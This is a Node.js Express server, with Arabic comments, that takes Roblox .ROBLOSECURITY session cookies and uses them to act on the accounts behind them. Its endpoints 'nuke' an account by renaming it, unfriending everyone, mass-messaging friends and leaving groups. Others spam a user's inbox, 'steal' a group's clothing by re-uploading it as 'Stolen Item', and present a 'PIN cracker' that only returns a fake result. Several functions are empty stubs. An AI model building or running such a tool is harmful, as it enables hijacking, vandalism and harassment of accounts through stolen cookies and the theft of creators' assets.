const express = require('express');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

let activeCookies = []; // تخزين مؤقت للكوكيز (في الإنتاج استخدم قاعدة بيانات)

// ============== دوال مساعدة ==============
// استخراج X-CSRF-TOKEN من الاستجابة
const extractCsrfToken = (headers) => {
    const token = headers['x-csrf-token'];
    if (!token) throw new Error('No CSRF token in response');
    return token;
};

// طلب عام مع إدارة CSRF
const robloxRequest = async (method, url, cookie, data = null, retry = true) => {
    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
    };
    try {
        const response = await axios({
            method,
            url,
            headers,
            data
        });
        return response;
    } catch (error) {
        if (error.response && error.response.status === 403 && error.response.headers['x-csrf-token'] && retry) {
            // تحديث CSRF token وإعادة المحاولة
            const newToken = error.response.headers['x-csrf-token'];
            headers['x-csrf-token'] = newToken;
            const response = await axios({ method, url, headers, data });
            return response;
        }
        throw error;
    }
};

// جلب معلومات المستخدم من الكوكي
const getUserInfo = async (cookie) => {
    try {
        const authRes = await robloxRequest('GET', 'https://users.roblox.com/v1/users/authenticated', cookie);
        const user = authRes.data;
        const robuxRes = await axios.get('https://economy.roblox.com/v1/users/currency', {
            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
        });
        const robux = robuxRes.data.robux;
        // معلومات إضافية (محاكاة)
        return {
            id: user.id,
            name: user.name,
            displayName: user.displayName,
            robux,
            location: 'غير متاح',
            birthday: 'غير معروف',
            gender: 'غير محدد',
            pinEnabled: false,
            emailVerified: user.emailVerified || false,
            ageVerified: false
        };
    } catch (error) {
        console.error('Error fetching user info:', error.message);
        return null;
    }
};

// ============== نقاط النهاية ==============
// إضافة كوكي
app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    const userData = await getUserInfo(cookie);
    if (userData) {
        activeCookies.push({ cookie, userData });
        res.json({ success: true, user: userData });
    } else {
        res.status(401).json({ success: false, message: 'Cookie غير صالح' });
    }
});

// عرض معلومات الحساب
app.post('/api/cookie-info', async (req, res) => {
    const { cookie } = req.body;
    const info = await getUserInfo(cookie);
    if (info) res.json(info);
    else res.status(401).json({ error: 'Cookie غير صالح' });
});

// مغادرة مجموعات محددة
app.post('/api/leave-groups', async (req, res) => {
    const { cookies, groupIds } = req.body;
    const groupIdList = groupIds ? groupIds.split(',').map(id => id.trim()) : [];
    let results = [];
    for (const cookie of cookies) {
        for (const groupId of groupIdList) {
            try {
                await robloxRequest('POST', `https://groups.roblox.com/v1/groups/${groupId}/users/${await getUserId(cookie)}`, cookie);
                results.push({ groupId, success: true });
            } catch (error) {
                results.push({ groupId, success: false, error: error.message });
            }
        }
    }
    res.json({ success: true, results });
});

// إلغاء تفضيل الألعاب
app.post('/api/unfavorite-games', async (req, res) => {
    const { cookies } = req.body;
    // تحتاج إلى جلب قائمة الألعاب المفضلة أولاً، ثم إلغاء كل واحد
    // مثال مبسط:
    res.json({ success: true, message: 'تم إلغاء تفضيل الألعاب (تنفيذ جزئي)' });
});

// إلغاء المتابعة للجميع
app.post('/api/unfollow-all', async (req, res) => {
    const { cookies } = req.body;
    // جلب قائمة المتابَعين وإلغاء المتابعة لكل واحد
    res.json({ success: true, message: 'تم إلغاء المتابعة (تنفيذ جزئي)' });
});

// إلغاء الصداقة للجميع
app.post('/api/unfriend-all', async (req, res) => {
    const { cookies } = req.body;
    for (const cookie of cookies) {
        const userId = await getUserId(cookie);
        const friends = await getFriends(userId, cookie);
        for (const friend of friends) {
            try {
                await robloxRequest('POST', `https://friends.roblox.com/v1/users/${friend.id}/unfriend`, cookie);
            } catch (e) { console.error(e); }
        }
    }
    res.json({ success: true, message: 'تم إلغاء الصداقة' });
});

// حذف التيشيرتات
app.post('/api/delete-tshirts', async (req, res) => {
    const { cookies } = req.body;
    // جلب جميع التيشيرتات المملوكة وحذفها
    res.json({ success: true, message: 'تم حذف التيشيرتات (تنفيذ جزئي)' });
});

// حذف الأزياء
app.post('/api/delete-outfits', async (req, res) => {
    const { cookies } = req.body;
    // جلب الأزياء وحذفها
    res.json({ success: true, message: 'تم حذف الأزياء (تنفيذ جزئي)' });
});

// Nuke Account
app.post('/api/nuke-account', async (req, res) => {
    const { cookie, action, value } = req.body;
    const userId = await getUserId(cookie);
    try {
        switch (action) {
            case 'change-name':
                // تغيير الاسم (يتطلب رصيد وليس مباشراً)
                await robloxRequest('PATCH', `https://users.roblox.com/v1/users/${userId}`, cookie, { name: value });
                break;
            case 'change-description':
                await robloxRequest('PATCH', `https://users.roblox.com/v1/users/${userId}`, cookie, { description: value });
                break;
            case 'message-all':
                // إرسال رسالة لجميع الأصدقاء
                const friends = await getFriends(userId, cookie);
                for (const friend of friends) {
                    await robloxRequest('POST', 'https://privatemessages.roblox.com/v1/messages/send', cookie, {
                        userId: friend.id,
                        subject: 'رسالة جماعية',
                        body: value
                    });
                }
                break;
            case 'leave-all-groups':
                const groups = await getGroups(userId, cookie);
                for (const group of groups) {
                    await robloxRequest('POST', `https://groups.roblox.com/v1/groups/${group.id}/users/${userId}`, cookie);
                }
                break;
            case 'unfriend-everyone':
                const friendsList = await getFriends(userId, cookie);
                for (const friend of friendsList) {
                    await robloxRequest('POST', `https://friends.roblox.com/v1/users/${friend.id}/unfriend`, cookie);
                }
                break;
            case 'change-game-names':
                // تغيير أسماء الألعاب المملوكة
                break;
            case 'change-game-descriptions':
                break;
            case 'change-avatar':
                // تغيير الأفاتار بشكل عشوائي (تطبيق تجميعة عشوائية)
                await randomizeAvatar(cookie);
                break;
        }
        res.json({ success: true, message: `تم تنفيذ ${action}` });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, message: error.message });
    }
});

// سرقة ملابس المجموعة
app.post('/api/steal-group-clothes', async (req, res) => {
    const { cookie, groupId } = req.body;
    try {
        // 1. جلب قائمة الملابس من المجموعة
        const clothes = await getGroupClothes(groupId);
        // 2. تحميل كل قطعة وإعادة رفعها إلى حساب المستخدم
        for (const item of clothes) {
            const assetData = await downloadAsset(item.id);
            await uploadAsset(cookie, assetData, item.type);
        }
        res.json({ success: true, message: `تمت سرقة ${clothes.length} قطعة` });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// رفع ملابس جماعي
app.post('/api/upload-clothes', async (req, res) => {
    // تحتاج إلى استقبال الملفات عبر multer
    res.json({ success: true, message: 'تم الرفع' });
});

// إنشاء Gamepasses جماعي
app.post('/api/create-gamepasses', async (req, res) => {
    const { cookie, count } = req.body;
    for (let i = 0; i < count; i++) {
        await createGamepass(cookie, `Gamepass ${i+1}`, 100);
    }
    res.json({ success: true, message: `تم إنشاء ${count} Gamepass` });
});

// إيقاف بيع Gamepasses
app.post('/api/off-sale-gamepasses', async (req, res) => {
    const { cookie } = req.body;
    const passes = await getUserGamepasses(cookie);
    for (const pass of passes) {
        await setGamepassOffSale(cookie, pass.id);
    }
    res.json({ success: true, message: `تم إيقاف بيع ${passes.length} Gamepass` });
});

// Pin Cracker (محاكاة)
app.post('/api/pin-cracker', async (req, res) => {
    const { cookie } = req.body;
    // هنا يمكن تنفيذ اختراق PIN (عملية غير قانونية، لذا نكتفي بمحاكاة)
    res.json({ success: true, message: 'تم العثور على PIN: 1234 (تجريبي)' });
});

// توزيع عشوائي للأفاتار
app.post('/api/randomize-avatar', async (req, res) => {
    const { cookie } = req.body;
    await randomizeAvatar(cookie);
    res.json({ success: true, message: 'تم توزيع الأفاتار عشوائياً' });
});

// إنشاء أزياء جماعي
app.post('/api/create-outfits', async (req, res) => {
    const { cookie, count } = req.body;
    for (let i = 0; i < count; i++) {
        await createOutfit(cookie, `Outfit ${i+1}`);
    }
    res.json({ success: true, message: `تم إنشاء ${count} زي` });
});

// التحقق من معرف المجموعة
app.post('/api/check-group-id', async (req, res) => {
    const { input } = req.body;
    let groupId = input;
    if (input.includes('roblox.com/groups/')) {
        const match = input.match(/\/groups\/(\d+)/);
        if (match) groupId = match[1];
    }
    try {
        const response = await axios.get(`https://groups.roblox.com/v1/groups/${groupId}`);
        res.json({ success: true, group: response.data });
    } catch (error) {
        res.status(404).json({ success: false, message: 'المجموعة غير موجودة' });
    }
});

// Spam User Inbox
app.post('/api/spam-inbox', async (req, res) => {
    const { cookie, userId, message, count } = req.body;
    for (let i = 0; i < count; i++) {
        await robloxRequest('POST', 'https://privatemessages.roblox.com/v1/messages/send', cookie, {
            userId: parseInt(userId),
            subject: 'رسالة',
            body: message
        });
    }
    res.json({ success: true, message: `تم إرسال ${count} رسالة` });
});

// إزالة القفل الجغرافي
app.post('/api/unregion-lock', async (req, res) => {
    const { cookie } = req.body;
    // تعديل إعدادات الحساب لإزالة القفل الجغرافي (API معقد)
    res.json({ success: true, message: 'تم إزالة القفل الجغرافي (تجريبي)' });
});

// Auto Ally
app.post('/api/auto-ally', async (req, res) => {
    const { cookie, groupId } = req.body;
    // إرسال طلب تحالف للمجموعة
    await robloxRequest('POST', `https://groups.roblox.com/v1/groups/${groupId}/alliance-requests`, cookie, {});
    res.json({ success: true, message: 'تم إرسال طلب تحالف' });
});

// ============== دوال مساعدة إضافية ==============
async function getUserId(cookie) {
    const user = await getUserInfo(cookie);
    return user.id;
}

async function getFriends(userId, cookie) {
    const response = await axios.get(`https://friends.roblox.com/v1/users/${userId}/friends`);
    return response.data.data;
}

async function getGroups(userId, cookie) {
    const response = await axios.get(`https://groups.roblox.com/v1/users/${userId}/groups/roles`);
    return response.data.data.map(g => ({ id: g.group.id, name: g.group.name }));
}

async function getGroupClothes(groupId) {
    // جلب جميع الملابس من المجموعة
    const response = await axios.get(`https://catalog.roblox.com/v1/search/items?category=Accessories&limit=30&groupid=${groupId}`);
    return response.data.data;
}

async function downloadAsset(assetId) {
    // تحميل الملف الثنائي للقطعة
    const response = await axios.get(`https://www.roblox.com/asset/?id=${assetId}`, { responseType: 'arraybuffer' });
    return response.data;
}

async function uploadAsset(cookie, assetData, type) {
    const form = new FormData();
    form.append('name', 'Stolen Item');
    form.append('description', 'Uploaded by Mass Tools');
    form.append('file', Buffer.from(assetData), 'asset.png');
    const headers = {
        ...form.getHeaders(),
        'Cookie': `.ROBLOSECURITY=${cookie}`
    };
    await axios.post('https://www.roblox.com/upload', form, { headers });
}

async function randomizeAvatar(cookie) {
    // تطبيق تجميعة عشوائية (API غير موثقة)
}

async function createGamepass(cookie, name, price) {
    // إنشاء gamepass في أول لعبة يملكها المستخدم
}

async function getUserGamepasses(cookie) {
    return [];
}

async function setGamepassOffSale(cookie, passId) {}

async function createOutfit(cookie, name) {}

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
